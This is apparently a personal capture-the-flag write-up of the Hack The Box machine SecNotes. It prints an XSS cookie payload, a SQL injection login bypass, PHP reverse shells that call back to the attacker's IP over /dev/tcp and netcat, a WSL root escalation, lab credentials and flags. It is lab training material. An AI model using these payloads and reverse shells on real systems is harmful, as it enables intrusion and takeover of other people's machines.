---
date: 2024-10-02
title: SecNotes HTB Write-Up
machine_ip: 10.10.10.97
os: Windows
difficulty: Medium
my_rating: 3
tags:
  - Windows
  - PrivEsc
  - WSL
  - dirsearch
  - where
  - psexec
  - wmiexec
  - smbexec
  - smbmap
  - SMB
  - XSS
  - SQLInjection
  - php
  - stty
  - history
references: "[[📚CTF Box Writeups]]"
---

# Enumeration

- Nmap
```
┌──(root㉿kali)-[~/Downloads]
└─# nmap -A -p- -T4 10.10.10.97        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-02 10:43 PDT
Nmap scan report for 10.10.10.97
Host is up (0.093s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP (85%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: Microsoft Windows XP SP3 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-10-02T17:45:25
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2024-10-02T10:45:27-07:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 2h20m01s, deviation: 4h02m31s, median: 0s

TRACEROUTE (using port 445/tcp)
HOP RTT      ADDRESS
1   89.36 ms 10.10.14.1
2   89.74 ms 10.10.10.97

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 178.47 seconds
```

- `dirsearch` shows a `register.php` directory
```
┌──(root㉿kali)-[~/Downloads]
└─# dirsearch -u 10.10.10.97
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                            
 (_||| _) (/_(_|| (_| )                                                                                                                                     
                                                                                                                                                            
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Downloads/reports/_10.10.10.97/_24-10-02_10-53-36.txt

Target: http://10.10.10.97/

[10:53:42] Starting:                                                                                                                                        
[10:53:43] 403 -  312B  - /%2e%2e//google.com                               
[10:53:44] 403 -  312B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd             
[10:53:51] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[10:54:03] 500 -    1KB - /auth.php                                         
[10:54:06] 403 -  312B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd     
[10:54:11] 500 -    1KB - /db.php                                           
[10:54:22] 200 -    1KB - /login.php                                        
[10:54:33] 200 -    2KB - /register.php                                     
                                                                             
Task Completed      
```

- Registered account `user:password` and logged in
- Used Burpsuite to capture `GET` and `POST` http requests
- On the Home page and Contact Us page the email `tyler@secnotes.htb` is leaked
- Trying Intruder tab with Sniper in Burpsuite to bruteforce tyler's password. No luck
- Capturing more http requests
	- Change password page is `/change_pass.php`

- Vulnerable to XSS, successful alert:
	- `#"><img src=/ onerror=alert(document.cookie)>`
	- Added a new note with account `user:password` I created and got an alert popup showing cookie `PHPSESSID=mlqks3m0mp9onel04id20me9m8`
	- Attempt reverse shell with php
```php revshell.php
<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.4/4444 0>&1'"); ?>
```

- Python server to transfer file:
```
┌──(root㉿kali)-[~/Downloads]
└─# python3 -m http.server
```

- Note to submit in webapp to grab file:
```
#"><script src="http://10.10.14.4/revshell.php"></script>
```
- Not successful
- Following walkthrough below

# Foothold 
- gain shell via exploit
- Create an account via sign in page with `'OR 1 OR'` as username and password
- Login, and see all notes
- We can now see Tyler's creds `tyler:92g!mA8BGjOirkL%OG*&` under the note `new site`
- Enumerated shares
```
┌──(root㉿kali)-[~/Downloads]
└─# smbmap -u tyler -p '92g!mA8BGjOirkL%OG*&' -H 10.10.10.97

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
 SMBMap - Samba Share Enumerator v1.10.2 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authentidated session(s)                                                      
                                                                                                                                            
[+] IP: 10.10.10.97:445 Name: secnotes.htb              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        new-site                                                READ, WRITE
```

- Try `smbclient`
```
┌──(root㉿kali)-[~/Downloads]
└─# smbclient \\\\10.10.10.97\\new-site -U tyler
Password for [WORKGROUP\tyler]:
Try "help" to get a list of possible commands.
smb: \> 
```

- `psexec.py` does not work, drives not writable
- Upload `nc` to `SMB` share new-site
```
┌──(root㉿kali)-[~]
└─# cp /usr/share/windows-resources/binaries/nc.exe nc.exe   
```

```
┌──(root㉿kali)-[~]
└─# smbclient \\\\10.10.10.97\\new-site -U tyler
Password for [WORKGROUP\tyler]:
Try "help" to get a list of possible commands.
smb: \> put nc.exe
putting file nc.exe as \nc.exe (54.7 kb/s) (average 54.7 kb/s)
smb: \> ls
  .                                   D        0  Wed Oct  2 12:59:28 2024
  ..                                  D        0  Wed Oct  2 12:59:28 2024
  iisstart.htm                        A      696  Thu Jun 21 08:26:03 2018
  iisstart.png                        A    98757  Thu Jun 21 08:26:03 2018
  nc.exe                              A    59392  Wed Oct  2 12:59:29 2024

                7736063 blocks of size 4096. 3391003 blocks available
```

- Use revshell.php and save in same directory (`~)
```
<?php 
system('nc.exe -e cmd.exe 10.10.14.4 4444')
?>
```

- Put revshell.php on new-site share
```
smb: \> put revshell.php 
putting file revshell.php as \revshell.php (0.2 kb/s) (average 42.3 kb/s)
```

- Now navigate to `http://10.10.10.97:8808/revshell.php` with `nc` listener running on LHOST and a shell is caught
```
┌──(root㉿kali)-[~/Downloads]
└─# nc -lnvp 4444
listening on [any] 4444 ...


connect to [10.10.14.4] from (UNKNOWN) [10.10.10.97] 57689
Microsoft Windows [Version 10.0.17134.228]                                                                                                                  
(c) 2018 Microsoft Corporation. All rights reserved.                                                                                                        

C:\inetpub\new-site>
C:\inetpub\new-site>
C:\inetpub\new-site>whoami
whoami
secnotes\tyler
```
- `nc.exe` needs to be on the RHOST for php shell to work since the `revshell.php` uses `nc.exe` to send cmd to LHOST!

# PrivEsc
- escalate from user to root
- Found Linux Distro folder and Ubuntu
```
C:\Distros\Ubuntu>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 1E7B-9B76

 Directory of C:\Distros\Ubuntu

10/02/2024  01:38 PM    <DIR>          .
10/02/2024  01:38 PM    <DIR>          ..
07/11/2017  06:10 PM           190,434 AppxBlockMap.xml
07/11/2017  06:10 PM             2,475 AppxManifest.xml
06/21/2018  03:07 PM    <DIR>          AppxMetadata
07/11/2017  06:11 PM            10,554 AppxSignature.p7x
06/21/2018  03:07 PM    <DIR>          Assets
06/21/2018  03:07 PM    <DIR>          images
07/11/2017  06:10 PM       201,254,783 install.tar.gz
07/11/2017  06:10 PM             4,840 resources.pri
06/21/2018  05:51 PM    <DIR>          temp
07/11/2017  06:10 PM           222,208 ubuntu.exe
07/11/2017  06:10 PM               809 [Content_Types].xml
               7 File(s)    201,686,103 bytes
               6 Dir(s)  13,883,731,968 bytes free
```

- Find `bash.exe` and`wsl.exe` #where
```
C:\Distros\Ubuntu>where /R c:\windows bash.exe
where /R c:\windows bash.exe
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe

C:\Distros\Ubuntu>where /R c:\windows wsl.exe
where /R c:\windows wsl.exe
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe
```

- `wsl.exe` runs as root by default so if we pass the full file path for it and follow with any command, it will execute:
```
C:\inetpub\new-site>c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe whoami
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe whoami
root
```

- Upgrade to Linux terminal by executing the `bash.exe` with full fil path
```
c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe
mesg: ttyname failed: Inappropriate ioctl for device

whoami
root
uname -a
Linux SECNOTES 4.4.0-17134-Microsoft #137-Microsoft Thu Jun 14 18:46:00 PST 2018 x86_64 x86_64 x86_64 GNU/Linux
```

- Perform TTY escape Shell
```
python -c 'import pty; pty.spawn("/bin/bash")'
root@SECNOTES:~# whoami
whoami
root
```

- `history` command shows admin creds `administrator:u6!4ZwgwOM#^OBf#Nwnh`
```
root@SECNOTES:~# history
history
    1  cd /mnt/c/
    2  ls
    3  cd Users/
    4  cd /
    5  cd ~
    6  ls
    7  pwd
    8  mkdir filesystem
    9  mount //127.0.0.1/c$ filesystem/
   10  sudo apt install cifs-utils
   11  mount //127.0.0.1/c$ filesystem/
   12  mount //127.0.0.1/c$ filesystem/ -o user=administrator
   13  cat /proc/filesystems
   14  sudo modprobe cifs
   15  smbclient
   16  apt install smbclient
   17  smbclient
   18  smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
   19  > .bash_history 
   20  less .bash_history
   21  root@SECNOTES:~# whoami
```

- Get admin shell using `psexec.py` or `wmiexec.py` or `smbexec.py`
```
┌──(root㉿kali)-[~/Downloads]
└─# psexec.py administrator:'u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97
/usr/local/bin/psexec.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20240916.171021.65b774de', 'psexec.py')
Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.97.....
[*] Found writable share ADMIN$
[*] Uploading file WMRAzUkE.exe
[*] Opening SVCManager on 10.10.10.97.....
[*] Creating service QChF on 10.10.10.97.....
[*] Starting service QChF.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32> whoami
nt authority\system
```

- User flag - tyler
```
C:\Users\tyler\Desktop>type user.txt
type user.txt
041764c2b16c9a63da8c9bc5c86ba126
```

- Root flag
```
C:\Users\Administrator\Desktop> type root.txt
4de31878cc83708cbd61763f27d718dd
```